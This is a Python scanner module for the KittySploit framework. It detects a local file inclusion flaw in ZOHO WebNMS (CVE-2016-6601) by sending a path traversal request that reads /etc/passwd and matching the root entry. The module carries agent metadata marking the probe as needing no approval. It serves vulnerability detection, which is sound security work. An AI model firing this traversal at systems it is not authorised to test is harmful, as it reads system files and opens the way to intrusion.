#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZOHO WebNMS Framework before version 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZOHO WebNMS Framework <5.2 SP1 - Local File Inclusion Detection',
        'description': 'ZOHO WebNMS Framework before version 5.2 SP1 is vulnerable local file inclusion which allows an attacker to read arbitrary files via a .. (dot dot) in the fileName parameter to servlets/FetchFile.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'edb', 'zoho', 'lfi', 'webnms', 'zohocorp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/pedrib/PoC/blob/master/advisories/webnms-5.2-sp1-pwn.txt',
            'https://www.exploit-db.com/exploits/40229/',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-6601',
            'http://www.rapid7.com/db/modules/auxiliary/admin/http/webnms_cred_disclosure',
            'http://www.rapid7.com/db/modules/auxiliary/admin/http/webnms_file_download',
        ],
        'cve': 'CVE-2016-6601',
    }

    def run(self):
        r = self.http_request(method="GET", path='/servlets/FetchFile?fileName=../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="ZOHO WebNMS Framework <5.2 SP1 - Local File Inclusion detected",
                path='/servlets/FetchFile?fileName=../../../etc/passwd',
            )
            return True
        return False

